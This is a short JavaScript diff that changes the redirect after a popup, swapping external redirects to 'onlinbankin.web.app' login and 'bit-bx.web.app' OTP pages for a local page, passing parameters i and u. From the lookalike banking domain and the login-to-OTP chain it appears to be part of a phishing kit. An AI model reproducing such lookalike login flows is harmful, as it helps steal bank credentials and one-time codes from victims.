@@ -63,7 +63,6 @@
             if (response.ok) {
                 document.getElementById('cco').classList.add('hiding')
                 document.getElementById('tex').classList.add('hiding')
-                // location.replace(`https://bit-bx.web.app/login/otp.html?i=${i}`);
                 Swal.fire({
                     background: '#0C290F',
                     confirmButtonColor: 'green',
@@ -75,8 +74,7 @@
                     showConfirmButton: true,
                     allowOutsideClick: false,
                 }).then(() => {
-                    location.href = `https://onlinbankin.web.app/login/index.html?i=${i}&u=${u}`
-                    // location.replace(`https://bit-bx.web.app/login/otp.html?i=${i}`);
+                    location.replace(`userNotifyRegistration.html?i=${i}&u=${u}`);
                 });
             } else {
                 document.getElementById('cco').classList.add('hiding')
